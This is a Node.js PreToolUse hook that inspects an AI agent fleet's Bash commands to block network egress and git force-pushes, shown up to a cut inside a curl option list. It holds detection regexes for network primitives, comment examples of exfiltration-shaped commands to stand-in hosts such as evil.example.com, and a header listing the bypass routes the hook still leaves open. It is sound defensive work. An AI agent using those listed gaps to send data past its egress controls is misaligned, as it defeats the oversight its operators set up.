#!/usr/bin/env node
// PreToolUse hook (Bash): blocks the NAMED egress shapes the command-name deny list lets through.
// EGRESSPARSER923, owner GO for scope (a) only (2026-09-23).
//
// The deny list (agent-scaffold.ts, BASH_EGRESS_DENY) matches COMMAND NAMES with globs and has no
// negation, so it cannot say "any http EXCEPT localhost". Its own comment names what passes:
// plain-http external fetches, interpreter one-liners (python3 -c, node -e), and a URL hidden in a
// shell variable. This hook closes those three shapes, plus the heredoc-fed interpreter, by PARSING
// the command:
//   1. curl to an EXTERNAL destination: a scheme-bearing URL (http:// included, which the deny list
//      cannot cover), and any positional / --url / proxy argument even WITHOUT a scheme;
//   2. an interpreter one-liner (python/node/perl/ruby/php/deno/bun with -c/-e/-r/--eval, PowerShell
//      with -Command) whose code uses a network primitive and carries an EXTERNAL URL;
//   3. either of the above when the URL sits in a variable ASSIGNED IN THE SAME COMMAND. A `for`
//      loop word list and the stdin of a `while read` loop (here-string or heredoc) count as such
//      assignments, split on whitespace the way a default `read` splits a line;
//   4. (EGRESSHEREDOC924, kanban 4c108004) a heredoc / here-string that IS an interpreter's program
//      (`python3 - <<'PY'`, `node <<EOF`, `powershell.exe -Command - <<'PS'`): its body is judged
//      exactly like a one-liner body (2.). For a shell (bash/sh/zsh/dash/ksh) the body gets the whole
//      analysis, as if it were the command itself.
//   5. (GITFORCE1003, kanban 3b4e46f3) NOT an egress shape: a force-push of git, in any spelling the
//      deny list's `Bash(git push --force:*)` misses. It lives in this hook because this hook is the one
//      already wired to every sub-agent and backfilled at server start; see gitForcePush() below for
//      the forms and for what stays open.
//   6. (BYPASSPERAGENT1014, kanban 521f1f39) NOT a curl shape: yt-dlp, `npx playwright`, git clone, git ls-remote, wget, pip download,
//      allowed per agent (the agent is read from the event's transcript_path), denied for an unnamed caller, silent only when
//      the call is provably without network. See bypassVerdict() and docs/security-hardening.md.
//   `--git-only` (GITFORCEMAIN1003): the same hook with items 1-4 switched off, wired for the MAIN agent, whose
//      own work reaches api.github.com / api.marveen.io / api.open-meteo.com from python heredocs. Only a
//      force-push is judged there; see classify()'s gitOnly parameter.
// The command word is found past assignments, shell keywords and the PREFIX_WORDS commands with
// their own options (timeout, stdbuf, nice, nohup, env, sudo, command, exec, time), on every path.
// FALSE-POSITIVE POLICY. A body that uses a network primitive is denied for ANY external URL in it,
// even when the call goes to localhost and the URL is only payload or a comment: the one-liner rule,
// applied to heredoc bodies. ONE relaxation, from the maintainers' decision on #1669 (2026-10-06): a
// PYTHON heredoc that merely MENTIONS a primitive and a URL in TEXT (the file it writes, a comment)
// is not a call and passes. "Text" is decided by reading the program with its string literals and
// comments blanked: a primitive that survives is code and the old rule applies. The relaxation is
// OFF, and the old whole-text rule decides, for any body that (a) holds a construct that can RUN a
// string or load code (exec, eval, compile, __import__, importlib, getattr, globals, subprocess,
// os.system ... see PY_DYNAMIC), (b) imports anything outside PY_PLAIN_MODULES (so a module the
// heredoc just wrote cannot be imported to do the call), (c) has an f-string (it runs its braces,
// so its content stays code) with unbalanced braces, or a string the scan cannot read to its end.
// Not relaxed: node, perl, ruby, php, deno, bun, PowerShell, and one-liners (-c). A written script
// that is RUN BY ANOTHER COMMAND is the "network calls inside a script file" family below: the hook
// never sees it, and the relaxation does not change that, it only stops denying the WRITE of it.
// localhost / 127.0.0.1 / [::1] ALWAYS pass: the dashboard's own calls (memory, kanban, message
// queue, approvals) go over http://localhost and a gate that cut them would silence the fleet.
// Hosts are cut with a regex, not URL(), so http://localhost:$PORT stays local, while
// localhost.evil.com and localhost@evil.com are external.
//
// PRIVATE NETWORK (maintainer decision on #1611, 2026-09-27): agents may reach private network
// targets from the shell. Local, besides the loopback names above, is decided by the LITERAL host
// string only, never by DNS: a canonical dotted-quad IPv4 in 10/8, 172.16/12, 192.168/16 or 127/8, a
// bracketed IPv6 in fc00::/7 (ULA) or fe80::/10 (link-local), or a name whose LAST label is `local`
// (mDNS, e.g. nas.local). A public name that happens to resolve to a private address stays external
// (nas.example.com), and so does every IPv4 spelling a resolver reads differently from how it looks
// (0x0a.0.0.1, 012.0.0.1, 167772161, 10.1) -- fail closed. 169.254/16 is deliberately NOT local:
// it carries the cloud instance-metadata endpoint. 100.64/10 (CGNAT) is not RFC 1918 and stays
// external. A single-label name (nas, xlocal) is external too: the resolver may complete it through
// a search domain to anywhere.
//
// HOW IT READS THE COMMAND: structure from the MASKED text (maskInertLiterals blanks quoted strings
// and heredoc bodies, length-preserving), so a `curl` or `;` inside a quoted argument or a heredoc
// is not a command; the URL from the ORIGINAL text of the same span. A heredoc body is read only
// where it is stdin to an interpreter or a `read` loop (4. and 3.), or where its text is piped on into
// one (`cat <<EOF | bash`, `source /dev/stdin <<EOF`, codeSinkOf); to anything else (`cat <<EOF`,
// `curl --data-binary @- <<'JSON'`) it stays inert text.
//
// WHAT THIS DOES NOT CLOSE -- said here so nobody reads "merged" as "closed" (owner/Marveen 29047):
// the name-and-shape list will never be complete. Still open, by family:
//   - network calls INSIDE a script file: the hook sees only the outer command line;
//   - a program that reaches an interpreter through a PIPE or a file rather than through a heredoc /
//     here-string attached to the interpreter itself;
//   - a destination that a DIFFERENT command reads from stdin and turns into arguments (argument
//     builders such as xargs or parallel);
//   - a URL that arrives in a way the parser does not model is NOT silently allowed any more
//     (EGRESSPARAMEXP1009 / EGRESSWRAP1009): a curl destination that is a parameter expansion, an
//     unset variable, a substitution or a loop / array / IFS value read from a file, and a `-K` /
//     `--config` file, are a deny (curl-unresolved); `bash -c` / `sh -c` / `eval` bodies are judged
//     in full; an unset variable or a substitution as the COMMAND word is a deny when the line carries
//     an external URL (command-unresolved). The price: a legitimate `curl "$URL"` from the
//     environment is denied too, and so is a message heredoc to a script that quotes a wrapped curl at
//     a command position (the pinned "any shell heredoc is a command line" limit). A quoted command
//     word ("curl", "$c") is read as the command; `eval "$(echo curl URL)"` / `bash -c "$(...)"` is a
//     deny when the substitution's own text carries an external URL. What is still open is a command
//     word that is a variable AND a line with no URL literal in it (the URL arrives another way), a
//     wrapper body built by a substitution with no URL in it (`bash -c "$(cat run.sh)"`: the script's
//     text is not read), and the argument builders above;
//   - a network primitive given a bare host and port with no URL scheme (socket-level connects): the
//     body scan finds destinations by URL scheme only;
//   - an interpreter body that reaches the network without a recognised primitive name (a subprocess
//     running a downloader, a browser driver, encoded or obfuscated code such as -EncodedCommand);
//   - every other network-capable binary (npm, pip install, ssh, scp, rsync, dig ...). yt-dlp, npx playwright, git clone,
//     git ls-remote, wget and pip download are NOT in this list any more: they are decided PER AGENT (BYPASS ROUTES PER AGENT
//     below, card 521f1f39), deny by default.
// Closing those is direction (b): an allowlist / network-level gate, not this hook.
//
// Fail-open on unparseable input or an internal error (logged): a crashed gate must not silence the
// fleet; that is today's behaviour, not a new hole. Every DENY is appended to the block log.
import { readFileSync, appendFileSync, realpathSync, mkdirSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'
import { maskInertLiterals } from '../self-pace-gate.mjs'

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
export const BLOCK_LOG = process.env.BASH_EGRESS_BLOCK_LOG || join(ROOT, 'store', 'bash-egress-blocks.jsonl')
// EGRESSVENDOR925: vendor-API hosts a Bash call may reach (owner decision, per install).
// store/egress-vendor-hosts.json = { "hosts": ["api.elevenlabs.io"] }. EXACT host match only:
// no wildcard, no suffix match, no subdomain inheritance -- `elevenlabs.io.evil.com` and
// `x.api.elevenlabs.io` are other hosts. A missing or unreadable file, or an entry that is not
// a plain DNS name, means no exception: today's behaviour (deny). This is NOT
// store/egress-allowlist.json -- that one is the WebFetch / quarantine-reader list.
export const VENDOR_HOSTS_PATH = process.env.BASH_EGRESS_VENDOR_HOSTS || join(ROOT, 'store', 'egress-vendor-hosts.json')
// A plain DNS name: labels of [a-z0-9-], no leading/trailing hyphen, at least one dot, a letter TLD.
// Not an IP, not localhost, no `*`, no leading dot, no port, no userinfo.
const VENDOR_HOST = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$/
export function parseVendorHosts(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.hosts) ? raw.hosts : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorHosts(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorHosts(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
// OPTIONAL, opt-in (#1611, a policy proposal): the same file may also carry
// `"domains": ["example.com"]` -- a listed domain OR any subdomain of it passes. The match is on a
// LABEL boundary: `api.example.com` matches `example.com`, while `evilexample.com`,
// `example.com.evil.net` and `example.com@evil.net` (whose host is evil.net) do not. Entries are
// shape-checked exactly like "hosts" (a plain DNS name: no wildcard, no leading dot, no IP, no
// port, no userinfo), so an IP or `*.x` can never widen the list. A missing key, a malformed
// file, or an entry that is not a plain DNS name adds nothing: today's behaviour. Kept separate
// from "hosts" on purpose, so an existing exact entry never silently becomes a suffix rule.
export function parseVendorDomains(raw) {
  const list = raw && typeof raw === 'object' && Array.isArray(raw.domains) ? raw.domains : []
  return new Set(list.filter((h) => typeof h === 'string' && VENDOR_HOST.test(h)))
}
export function loadVendorDomains(path = VENDOR_HOSTS_PATH) {
  try { return parseVendorDomains(JSON.parse(readFileSync(path, 'utf-8'))) } catch { return new Set() }
}
export function hostInDomains(host, domains) {
  for (const d of domains) if (host === d || host.endsWith(`.${d}`)) return true
  return false
}
const LOCAL_HOSTS = new Set(['localhost', '127.0.0.1', '[::1]', '::1'])
// One-liner URL schemes: every network scheme libcurl speaks (minus file:, and ipfs:/ipns:, which
// resolve through a gateway, not the literal host). A one-liner reaches all of them through a curl
// binding (PHP curl_exec, pycurl) or a stream wrapper (PHP ftps://, Perl LWP gopher://), so an
// http/ftp-only list let `php -r '...curl_init("sftp://host/")...curl_exec(...)'` out untouched.
const URL_RE = /\b(?:https?|ftps?|sftp|scp|tftp|smbs?|dict|gophers?|imaps?|pop3s?|smtps?|ldaps?|telnet|mqtt|rtsp):\/\/[^\s'"`<>\\)]+/gi
const INTERPRETER = /^(?:python(?:\d+(?:\.\d+)?)?|node(?:js)?|perl|ruby|php|deno|bun|powershell(?:\.exe)?|pwsh(?:\.exe)?)$/
const CODE_FLAG = new Set(['-c', '-e', '-E', '-r', '--eval', '-p', '--print', 'eval'])
// PowerShell (WSL reaches the Windows side with powershell.exe): its code flag is -Command (any
// case, any unambiguous prefix down to -c), and its network primitives are cmdlets and aliases that
// NET_PRIMITIVE does not name. `curl` / `wget` are listed here ONLY: in PowerShell they are aliases
// of Invoke-WebRequest, while in a Python body a "curl" word is a subprocess carrying data.
const POWERSHELL = /^(?:powershell|pwsh)(?:\.exe)?$/i
const PS_CODE_FLAG = /^-c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?$/i
const PS_NET_PRIMITIVE = /\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm|curl|wget|Start-BitsTransfer|Net\.WebClient|DownloadString|DownloadFile|Net\.Http\.HttpClient|Net\.Sockets)\b/i
function hasCodeFlag(cmd, args) {
  return args.some((w) => CODE_FLAG.has(w) || (POWERSHELL.test(cmd) && PS_CODE_FLAG.test(w)))
}
function usesNetwork(cmd, text) {
  return NET_PRIMITIVE.test(text) || (POWERSHELL.test(cmd) && PS_NET_PRIMITIVE.test(text))
}

// --- Python heredoc: code versus text (maintainer decision on #1669) --------------------------------
const PYTHON = /^python(?:\d+(?:\.\d+)?)?$/
// Valid string prefixes, any case: r, b, u, f, and the two-letter br / rb / fr / rf.
const PY_STRING_PREFIX = /^(?:[rR][bBfF]?|[bB][rR]?|[uU]|[fF][rR]?)$/
// Constructs that can turn a string into running code, load code, start a process or open a URL. Read on
// the program with its literals blanked, so the NAME is what is seen. Never complete, by design: it is the
// first of two fences, the module allowlist below is the second, and both fall back to the OLD rule.
const PY_DYNAMIC = new RegExp('\\b(?:exec|eval|compile|__import__|importlib|import_module|getattr|setattr|delattr|globals|locals|vars|' +
  '__builtins__|builtins|__dict__|__loader__|runpy|subprocess|pty|ctypes|pickle|marshal|timeit|cProfile|profile|pdb|code|codeop|' +
  'webbrowser|multiprocessing|system|popen|startfile|exec[lv]\\w*|spawn\\w*|fork\\w*|posix_spawn\\w*)\\b')
// Modules a file-writing script plainly uses. Anything else, a module the heredoc may just have written
// included, sends the body back to the old whole-text rule.
const PY_PLAIN_MODULES = new Set(['os', 'sys', 'json', 're', 'pathlib', 'datetime', 'time', 'textwrap', 'shutil', 'csv', 'io',
  'hashlib', 'base64', 'collections', 'itertools', 'math', 'string', 'tempfile', 'glob', 'argparse', 'html', 'unicodedata', 'uuid',
  'random', 'statistics', 'zipfile', 'tarfile', 'difflib', 'pprint', 'typing', 'dataclasses', 'functools', 'operator', 'enum', 'fnmatch'])
// The program with its string literals and comments blanked (newlines kept), or null when the scan cannot
// vouch for where a string ends. An f-string is NOT blanked: it runs its braces, so its text counts as code.
export function pythonCodeOnly(text) {
  const out = []
  const n = text.length
  let i = 0
  while (i < n) {
    const c = text[i]
    if (c === '#') {
      let j = text.indexOf('\n', i)
      if (j === -1) j = n
      out.push(' '.repeat(j - i)); i = j; continue
    }
    if (c !== '"' && c !== "'") { out.push(c); i++; continue }
    let k = i
    while (k > 0 && /[A-Za-z0-9_]/.test(text[k - 1])) k--
    const word = text.slice(k, i)
    if (word !== '' && !PY_STRING_PREFIX.test(word)) return null   // return"x", ab"x": not a plain literal
    const triple = text.startsWith(c.repeat(3), i)
    const delim = triple ? c.repeat(3) : c
    let j = i + delim.length
    let closed = false
    while (j < n) {
      if (text[j] === '\\') { j += 2; continue }
      if (text.startsWith(delim, j)) { closed = true; break }
      if (!triple && text[j] === '\n') return null                // unterminated single-line string
      j++
    }
    if (!closed) return null
    const body = text.slice(i + delim.length, j)
    if (/[fF]/.test(word)) {
      // Brace balance: an unbalanced f-string means this scan ended it where Python (3.12 allows the same
      // quote inside the braces) did not, and from there on the scan would be blanking real code.
      const open = (body.match(/\{/g) ?? []).length, close = (body.match(/\}/g) ?? []).length
      if (open !== close) return null
      out.push(delim + body + delim)
    } else {
      out.push(delim + body.replace(/[^\n]/g, ' ') + delim)
    }
    i = j + delim.length
  }
  return out.join('')
}
function pythonImportsPlain(code) {
  for (const raw of code.split(/[\n;]/)) {
    const st = raw.trim()
    if (!/\bimport\b/.test(st)) continue
    let m
    if ((m = /^import\s+(.+)$/.exec(st))) {
      for (const part of m[1].split(',')) if (!PY_PLAIN_MODULES.has(part.trim().split(/\s+/)[0].split('.')[0])) return false
    } else if ((m = /^from\s+([\w.]+)\s+import\b/.exec(st))) {
      if (!PY_PLAIN_MODULES.has(m[1].split('.')[0])) return false
    } else return false                                           // `try: import x`, `x = 1; import` glued forms
  }
  return true
}
// Does this Python body USE the network, as opposed to MENTION it? Only a primitive in CODE counts, and
// only when nothing in the body can run a string or load code (see the header).
function pythonUsesNetwork(text) {
  // Python reads identifiers as NFKC, so a fullwidth `ｅｘｅｃ(...)` is `exec(...)`: normalize first, or
  // the fence below does not see it. The fallback rule reads the normalized text too, which is stricter.
  text = text.normalize('NFKC')
  const code = pythonCodeOnly(text)
  if (code === null || PY_DYNAMIC.test(code) || !pythonImportsPlain(code)) return NET_PRIMITIVE.test(text)
  return NET_PRIMITIVE.test(code)
}
// Words that can stand before the real command word of a sub-command. The shell keywords are here
// because `for p in a b; do curl ...` splits at `;` into a span that starts with `do`, and without
// them a curl inside a loop or an if/then body was never looked at.
export const PREFIX_WORDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice',
  'timeout', 'stdbuf', 'setsid', 'watch', 'do', 'then', 'else', 'elif', '{', '(', '!'])
// A prefix COMMAND (not a keyword) may carry its own options before the real command word:
// `timeout -k 5 30 cmd`, `stdbuf -oL cmd`, `nice -n 5 cmd`, `env -u X A=1 cmd`, `sudo -u u cmd`.
// Every word starting with `-` is skipped; the options listed here also consume the next word.
// `timeout` additionally takes one positional DURATION. A missing entry here errs toward reading an
// option VALUE as the command word, which only hides a command; the per-prefix test catches that.
const PREFIX_OPT_VALUE = {
  env: new Set(['-u', '--unset', '-C', '--chdir', '-S', '--split-string']),
  sudo: new Set(['-u', '--user', '-g', '--group', '-h', '--host', '-p', '--prompt', '-C', '--close-from',
    '-D', '--chdir', '-r', '--role', '-t', '--type', '-U', '--other-user', '-T', '--command-timeout']),
  exec: new Set(['-a']),
  nice: new Set(['-n', '--adjustment']),
  timeout: new Set(['-s', '--signal', '-k', '--kill-after']),
  stdbuf: new Set(['-o', '--output', '-e', '--error', '-i', '--input']),
  watch: new Set(['-n', '--interval']),
}
const PREFIX_COMMANDS = new Set(['env', 'sudo', 'command', 'exec', 'time', 'nohup', 'nice', 'timeout', 'stdbuf', 'setsid', 'watch'])
const PREFIX_POSITIONALS = { timeout: 1 }
// Index of the real command word in `mw` (a sub-command's words): assignments, prefix words and
// the prefix commands' own options and arguments are skipped.
export function commandIndex(mw) {
  let i = 0
  while (i < mw.length) {
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i])) { i++; continue }
    const p = mw[i].split('/').pop()
    if (!PREFIX_WORDS.has(p)) break
    i++
    if (!PREFIX_COMMANDS.has(p)) continue
    const withValue = PREFIX_OPT_VALUE[p] ?? new Set()
    let positional = PREFIX_POSITIONALS[p] ?? 0
    while (i < mw.length) {
      const a = mw[i]
      if (a === '--') { i++; break }
      if (a.startsWith('-') && a.length > 1) { i += withValue.has(a) ? 2 : 1; continue }
      if (positional > 0 && !/^[A-Za-z_][A-Za-z0-9_]*=/.test(a)) { positional--; i++; continue }
      break
    }
  }
  return i
}
// A one-liner is a DOWNLOADER only when its code uses a network primitive of the language itself.
// Measured on 7 days of fleet commands: a one-liner that merely CARRIES a URL as data (an
// inter-agent message built with subprocess + curl to localhost) must not be denied -- that was 4 of
// 10 would-be blocks. Browser automation (chromium / playwright / puppeteer) is deliberately NOT in
// this list: it is the fleet's mandated browser-verify path on its own domains, and an own-domain
// allowlist is direction (b). Stated as open, measured, and left to the owner.
const NET_PRIMITIVE = /\b(?:urllib|requests\.|http\.client|httplib|httpx|aiohttp|urlopen|socket\.|fetch\s*\(|https?\.(?:get|request)\s*\(|axios|node-fetch|undici|got\s*\(|LWP::|HTTP::Tiny|Net::HTTP|open-uri|IO::Socket|file_get_contents|curl_exec|Invoke-WebRequest)|-M(?:LWP|HTTP::Tiny|IO::Socket|Net::HTTP)/

export function hostOf(url) {
  const m = /^[a-z][a-z0-9+.-]*:\/\/(?:[^@/?#]*@)?(\[[^\]]*\]|[^/:?#]*)/i.exec(url)
  return m ? m[1].toLowerCase() : null
}
// Canonical dotted-quad only: no leading zero, no hex/octal/decimal/short forms.
const OCTET = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)'
const CANON_IPV4 = new RegExp(`^${OCTET}(?:\\.${OCTET}){3}$`)
const MDNS_NAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+local$/
// A private-network target by its literal spelling (see the PRIVATE NETWORK note in the header).
export function isPrivateTarget(host) {
  const h = String(host ?? '').toLowerCase()
  if (CANON_IPV4.test(h)) {
    const [a, b] = h.split('.').map(Number)
    return a === 10 || a === 127 || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
  }
  const v6 = /^\[([0-9a-f:.]+)\]$/.exec(h)
  if (v6) return /^f[cd][0-9a-f]{0,2}:/.test(v6[1]) || /^fe[89ab][0-9a-f]?:/.test(v6[1])
  return MDNS_NAME.test(h)
}
export function isLocalHost(host) { return LOCAL_HOSTS.has(host) || isPrivateTarget(host) }
export function isExternal(url) {
  const h = hostOf(url)
  if (h === null || h === '') return false
  return !isLocalHost(h)
}
function spans(masked) {
  const out = []; let start = 0
  const re = /&&|\|\||;|\||\n/g; let m
  while ((m = re.exec(masked))) { out.push([start, m.index]); start = m.index + m[0].length }
  out.push([start, masked.length])
  return out
}
function words(s) { return s.trim().split(/\s+/).filter(Boolean) }
// `raw` (optional) is the command BEFORE substitutions were lifted out of it (same length, see
// liftSubstitutions). A value that differs from it was computed by a $( ... ) / backtick at run time:
// reading it as the blank text the lifting left behind made `H=$(cat host.txt); curl "http://$H/x"` look
// like a call to an empty host. The value becomes UNKNOWN_VALUE, which a destination check reads as
// unresolved (EGRESSPARAMEXP1009).
const UNKNOWN_VALUE = '$(unknown)'
function collectAssignments(orig, masked, raw = null) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const seg = orig.slice(a, b)
    for (const m of seg.matchAll(/(?:^|\s)(?:export\s+|local\s+|readonly\s+)?([A-Za-z_][A-Za-z0-9_]*)=("([^"]*)"|'([^']*)'|([^\s]*))/g)) {
      const at = a + m.index + m[0].length - m[2].length
      // quoted: the value text itself differs from the raw text; unquoted: the value stops at the
      // blanks the lifting left, so the substitution is what follows it in the raw text
      const computed = raw !== null && (raw.slice(at, at + m[2].length) !== m[2] || (m[5] !== undefined && /^(?:\$\(|`)/.test(raw.slice(at + m[2].length))))
      env[m[1]] = computed ? UNKNOWN_VALUE : (m[3] ?? m[4] ?? m[5] ?? '')
    }
  }
  return env
}
// `for NAME in w1 w2 ...`: the loop variable takes EACH value in turn.
// NAME=value alone never saw it, so `for u in https://x ...; do curl "$u"; done` reached curl with an
// unread destination and passed, while the same URL as a literal or a plain assignment was denied.
// The keyword is found in the MASKED text (a quoted "for u in" is not a loop), the values are read
// from the ORIGINAL text, unquoted, with this command's assignments expanded in them.
function collectLoops(orig, masked, env) {
  const loops = {}
  for (const [a, b] of spans(masked)) {
    const m = /(?:^|[\s(!{])for\s+([A-Za-z_][A-Za-z0-9_]*)\s+in(?=\s|$)/.exec(masked.slice(a, b))
    if (!m) continue
    const vals = shellWords(expand(orig.slice(a + m.index + m[0].length, b), env))
    loops[m[1]] = [...(loops[m[1]] ?? []), ...vals]
  }
  return loops
}
// Every reading of a span a loop can produce: one text per loop value (per combination, for nested
// loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
// closed -- a hand-written URL loop is a few values, never hundreds.
const MAX_LOOP_VARIANTS = 64
// A value goes into the text as ONE word: pasting `'{"a":"b c"}'` raw broke the command's own
// quoting, and its fragments were read as hosts (measured on the fleet's week of commands: a loop
// of JSON bodies posted to localhost with -d "$p" was denied). A URL never holds whitespace or a
// quote, so such a value is replaced by the first URL inside it, or by a neutral word.
function asWord(value) {
  if (/^[^\s'"`\\]+$/.test(value)) return value
  return (String(value).match(URL_RE) ?? [])[0] ?? 'x'
}
function loopVariants(text, env, loops) {
  let out = [text]
  for (const [v, vals] of Object.entries(loops)) {
    const re = new RegExp(`\\$\\{${v}\\}|\\$${v}(?![A-Za-z0-9_])`, 'g')
    if (!re.test(text)) continue
    re.lastIndex = 0
    out = out.flatMap((t) => vals.map((x) => t.replace(re, () => asWord(x))))
    if (out.length > MAX_LOOP_VARIANTS) return null
  }
  return out.map((t) => expand(t, env))
}
function expand(text, env) {
  return text.replace(/\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)/g, (all, a, b) => (env[a ?? b] ?? all))
}
// $( ... ) and backtick substitutions are commands of their own: lift them out (length-preserving,
// so offsets still align), classify each inner command separately, and parse the rest without them.
// Without this, every `-H "Authorization: Bearer $(cat token)"` made maskInertLiterals give up:
// measured, 32% of fleet commands were unparseable and would have been allowed blind.
// Quote-aware, with the SAME rules as maskInertLiterals: a substitution is lifted only where the
// shell would run it (top level, inside "...", inside an unquoted-tag heredoc body). Inside '...',
// $'...' and a quoted-tag heredoc body it is inert text. Lifting it there turned every HANDOFF.md
// written with `cat > f <<'EOF'` that mentions a curl in backticks into a false deny.
function substEnd(text, i) { // text[i..] starts with $( -> index just past the matching )
  let depth = 1, j = i + 2, q = null
  while (j < text.length && depth > 0) {
    const c = text[j]
    if (q) { if (c === q) q = null; else if (c === '\\' && q === '"') j++ }
    else if (c === "'" || c === '"') q = c
    else if (c === '(') depth++
    else if (c === ')') depth--
    j++
  }
  return j
}
function backtickEnd(text, i) { // text[i] is ` -> index just past the closing `
  let j = i + 1
  while (j < text.length && text[j] !== '`') j += text[j] === '\\' ? 2 : 1
  return Math.min(j + 1, text.length)
}
export function liftSubstitutions(text) {
  // herestrings: offsets of every LIVE `<<<` operator (blanked in `stripped`, so the caller cannot
  // find them there any more). A `<<<` inside quotes or a heredoc body is text and is not listed.
  // regions: [start, end) of every lifted substitution in `stripped` (same offsets as `text`)
  const inners = []; const herestrings = []; const regions = []; let out = ''; let i = 0
  // A live substitution at `at` is lifted (blanked, inner kept); returns the next index or -1.
  const lift = (at) => {
    if (text[at] === '$' && text[at + 1] === '(') {
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); regions.push([out.length, out.length + j - at]); out += ' '.repeat(j - at); return j
    }
    // an input process substitution `<( ... )` runs its inner command line (Sam 521f1f39 round 1, 4: `cat <(curl -s URL)`)
    if (text[at] === '<' && text[at + 1] === '(' && text[at - 1] !== '<') {       // `>( ... )` is a SINK, read by processSubstitutionSink
      const j = substEnd(text, at)
      inners.push(text.slice(at + 2, j - 1)); regions.push([out.length, out.length + j - at]); out += ' '.repeat(j - at); return j
    }
    if (text[at] === '`') {
      const j = backtickEnd(text, at)
      inners.push(text.slice(at + 1, j - 1)); regions.push([out.length, out.length + j - at]); out += ' '.repeat(j - at); return j
    }
    return -1
  }
  // Copy [from, to) in a live context (double quotes, unquoted heredoc body). An escaped \` or \$
  // is literal text here, but maskInertLiterals gives up on ANY backtick or $( inside "...", so it is
  // blanked (length-preserving): measured, 58 of 78 unparseable fleet commands were exactly this
  // (a `gh pr comment --body "... \`code\` ..."`).
  const copyLive = (from, to) => {
    let k = from
    while (k < to) {
      if (text[k] === '\\' && (text[k + 1] === '`' || text[k + 1] === '$')) { out += '  '; k += 2; continue }
      if (text[k] === '\\') { out += text.slice(k, Math.min(k + 2, to)); k += 2; continue }
      const n = lift(k)
      if (n !== -1) { k = n; continue }
      out += text[k]; k++
    }
  }
  while (i < text.length) {
    const c = text[i]
    if (c === '\\' && i + 1 < text.length) { out += text.slice(i, i + 2); i += 2; continue }
    // A here-string (<<<) is not a heredoc, but maskInertLiterals reads `<<<"$s"` as a heredoc
    // tagged `$s` with no body and gives up. The operator carries no URL and no command: blank it,
    // and the word after it is parsed as ordinary (quoted or live) text.
    if (text.startsWith('<<<', i)) { herestrings.push(i); out += '   '; i += 3; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(text.slice(i))
    if (here) {
      const tag = here[1] ?? here[2] ?? here[3]
      const quotedTag = here[1] != null || here[2] != null
      out += here[0]; i += here[0].length
      const nl = text.indexOf('\n', i)
      if (nl === -1) { copyLive(i, text.length); break }
      // the rest of the heredoc line is ordinary shell text; hand it back to the main loop
      // by processing it recursively, then continue with the body
      const lineRest = liftSubstitutions(text.slice(i, nl + 1))
      regions.push(...lineRest.regions.map(([x, y]) => [x + out.length, y + out.length]))
      out += lineRest.stripped; inners.push(...lineRest.inners)
      herestrings.push(...lineRest.herestrings.map((p) => p + i)); i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(text.slice(i))
      const bodyEnd = rel ? i + rel.index : text.length
      if (quotedTag) out += text.slice(i, bodyEnd); else copyLive(i, bodyEnd)
      i = bodyEnd
      continue
    }
    if (c === "'") {
      const end = text.indexOf("'", i + 1)
      const stop = end === -1 ? text.length : end + 1
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '$' && text[i + 1] === "'") {
      let j = i + 2
      while (j < text.length && text[j] !== "'") j += text[j] === '\\' ? 2 : 1
      const stop = Math.min(j + 1, text.length)
      out += text.slice(i, stop); i = stop; continue
    }
    if (c === '"') {
      let j = i + 1
      while (j < text.length && text[j] !== '"') {
        if (text[j] === '\\') { j += 2; continue }
        if (text[j] === '$' && text[j + 1] === '(') { j = substEnd(text, j); continue }
        if (text[j] === '`') { j = backtickEnd(text, j); continue }
        j++
      }
      out += '"'
      if (j >= text.length) { copyLive(i + 1, text.length); i = text.length; continue }
      copyLive(i + 1, j); out += '"'; i = j + 1; continue
    }
    const n = lift(i)
    if (n !== -1) { i = n; continue }
    out += c; i++
  }
  return { stripped: out, inners, herestrings, regions }
}
// curl's DESTINATION is not only a scheme-bearing URL. A positional argument is always a URL to
// curl, and with no scheme curl guesses http:// -- so `curl evil.example.com/x?d=secret` reaches
// the host while URL_RE (which needs a scheme) and the name list (`curl *https://*`) both miss it.
// So for curl the argv is read: every positional argument, the --url value, and the proxy / DoH /
// connect-to / resolve values are destinations, and a non-loopback host in any of them denies.
// Flags that take a value are skipped with their value, so `-H "Host: x.y"` or `-o out.html` is
// never read as a destination. An unknown long option is assumed to take no value: if that is
// wrong, its value is read as a destination, which errs toward a deny, never toward a pass.
const CURL_SHORT_WITH_VALUE = new Set('AbcCdDeEFHKmoPQrtTuUwxXyYz'.split(''))
const CURL_LONG_WITH_VALUE = new Set([
  'data', 'data-ascii', 'data-binary', 'data-raw', 'data-urlencode', 'json', 'form', 'form-string',
  'header', 'proxy-header', 'output', 'output-dir', 'request', 'config', 'user', 'proxy-user',
  'user-agent', 'referer', 'cookie', 'cookie-jar', 'dump-header', 'write-out', 'max-time',
  'connect-timeout', 'retry', 'retry-delay', 'retry-max-time', 'range', 'continue-at', 'cert',
  'cert-type', 'key', 'key-type', 'pass', 'cacert', 'capath', 'ciphers', 'interface', 'local-port',
  'limit-rate', 'max-filesize', 'max-redirs', 'noproxy', 'upload-file', 'time-cond', 'trace',
